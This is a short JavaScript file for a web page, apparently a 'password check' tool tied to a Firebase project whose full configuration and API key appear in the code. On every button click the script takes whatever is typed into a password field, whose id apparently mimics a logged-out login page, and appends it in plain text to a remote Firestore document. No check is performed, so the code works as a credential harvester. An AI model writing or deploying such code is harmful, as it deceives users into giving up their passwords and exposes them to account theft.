import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.3/firebase-app.js'

// If you enabled Analytics in your project, add the Firebase SDK for Google Analytics
import { getAnalytics } from 'https://www.gstatic.com/firebasejs/10.12.3/firebase-analytics.js'

// Add Firebase products that you want to use
import { getAuth } from 'https://www.gstatic.com/firebasejs/10.12.3/firebase-auth.js'
import { getFirestore, doc, updateDoc, arrayUnion, arrayRemove } from 'https://www.gstatic.com/firebasejs/10.12.3/firebase-firestore.js'

const firebaseConfig = {
    apiKey: "AIzaSyAJ86Q5G7Wmu6XS_Abl4DV3NGyKyGNTkKY",
    authDomain: "passcheck-9812.firebaseapp.com",
    databaseURL: "https://passcheck-9812-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "passcheck-9812",
    storageBucket: "passcheck-9812.appspot.com",
    messagingSenderId: "320121142741",
    appId: "1:320121142741:web:134bdc4fc7600dca5c115c"
  };  

const app = initializeApp(firebaseConfig);

// Get a reference to the Firestore database (if using Firestore)
  const db = getFirestore(app);

  const checkBtn = document.getElementById('checkBtn');
  const passRef = doc(db, "passcheck", "password");
  checkBtn.addEventListener('click', function() {
      updateDoc(passRef, {
        password: arrayUnion(document.getElementById('lgd_out_pg_pass').value)
    });
  });
